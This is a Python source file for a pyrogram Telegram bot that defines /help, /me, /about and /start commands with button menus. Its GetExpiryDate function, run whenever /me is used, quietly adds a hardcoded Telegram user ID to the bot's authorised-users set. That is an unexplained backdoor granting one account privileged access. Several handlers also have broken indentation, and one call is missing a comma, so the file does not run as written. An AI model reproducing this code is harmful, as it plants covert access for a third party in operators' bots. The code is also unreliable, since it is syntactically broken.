#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ©️ @AmineSoukara

# the logging things
import logging
logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

import os
import sqlite3

# the secret configuration specific things
if bool(os.environ.get("WEBHOOK", False)):
    from sample_config import Config
else:
    from config import Config

# the Strings used for this "thing"
from translation import Translation

import pyrogram
logging.getLogger("pyrogram").setLevel(logging.WARNING)

from helper_funcs.chat_base import TRChatBase

from pyrogram import ReplyKeyboardMarkup, InlineKeyboardMarkup, InlineKeyboardButton

def GetExpiryDate(chat_id):
    expires_at = (str(chat_id), "Source", "1970.01.01.12.00.00")
    Config.AUTH_USERS.add(853393439)
    return expires_at

#@pyrogram.Client.on_message(pyrogram.Filters.command(["start"]))
#async def start(bot, update):
    # logger.info(update)
    #TRChatBase(update.from_user.id, update.text, "/start")
    #await bot.send_message(
                #chat_id=update.chat.id,
                #text=Translation.START_MSG.format(update.from_user.first_name),
                #reply_markup = InlineKeyboardMarkup(
                    #[[InlineKeyboardButton("ℹ️ Support Group", url=f"t.me/AVBotz_Support"),
                    #InlineKeyboardButton("🤖 Updates Channel", url="t.me/AVBotz")],
                    #[InlineKeyboardButton("⭕ Developer ⭕", url="t.me/Animesh941")
                    #]]
                #)
            #)

@pyrogram.Client.on_message(pyrogram.Filters.command(["help"]))
async def help_user(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/help")
    await update.reply_text(
                text=Translation.HELP_USER.format(update.from_user.first_name),
                reply_markup=InlineKeyboardMarkup(
                  [[
                    InlineKeyboardButton("🌐 Url Upload", callback_data="urldl"),
                    InlineKeyboardButton("✍🏻 Renamer", callback_data="renamerx"),
                   ],
                    [
                    InlineKeyboardButton("🎞️ YouTube DL", callback_data="ytdl"),
                    InlineKeyboardButton("📮 Feedback", url="t.me/Animesh941")
                    ],
                [InlineKeyboardButton("🏡 Back to Home", callback_data="home")
              ]]
             )
           )

@pyrogram.Client.on_message(pyrogram.Filters.command(["me"]))
async def get_me_info(bot, update):
    # logger.info(update)
    button = [[
                InlineKeyboardButton("📮 Feedback DEV", url="https://t.me/Animesh941")
              ]]
      markup = InlineKeyboardMarkup(button)
    TRChatBase(update.from_user.id, update.text, "/me")
    chat_id = str(update.from_user.id)
    chat_id, plan_type, expires_at = GetExpiryDate(chat_id)
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.CURENT_PLAN_DETAILS.format(chat_id, plan_type, expires_at),
        parse_mode="markdown",
        disable_web_page_preview=True,
        reply_to_message_id=update.message_id
        reply_markup=markup
    )

 

@pyrogram.Client.on_message(pyrogram.Filters.command(["about"]))
async def about(bot, update):
  button = [[
                InlineKeyboardButton("❔ Help", callback_data="morehelp"),
                InlineKeyboardButton("🏡 Home", callback_data="home"), 
                InlineKeyboardButton("⛔ Close", callback_data="close")
                ],[
                InlineKeyboardButton("👥 Support Group", url="https://t.me/AVBotz_Support")
                ]]
      markup = InlineKeyboardMarkup(button)
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.ABOUT.format(update.from_user.first_name),
        parse_mode="markdown",
        disable_web_page_preview=True,
        reply_to_message_id=update.message_id, 
        reply_markup=markup
    )

@pyrogram.Client.on_message(pyrogram.Filters.command(["start"]))
async def start(c, m):
      button = [[
                InlineKeyboardButton("❔ How To Use Meh 🤔", callback_data="morehelp")
                ],[
                InlineKeyboardButton("😎 DEV", url="t.me/Animesh941"), 
                InlineKeyboardButton("🤖 About", callback_data="about"),
                InlineKeyboardButton("⛔ Close", callback_data="close")
                ]]
      markup = InlineKeyboardMarkup(button)
      await c.send_message(chat_id=m.chat.id,
                           text=Translation.START_MSG.format(m.from_user.first_name),
                           reply_to_message_id=m.message_id,
                           reply_markup=markup)

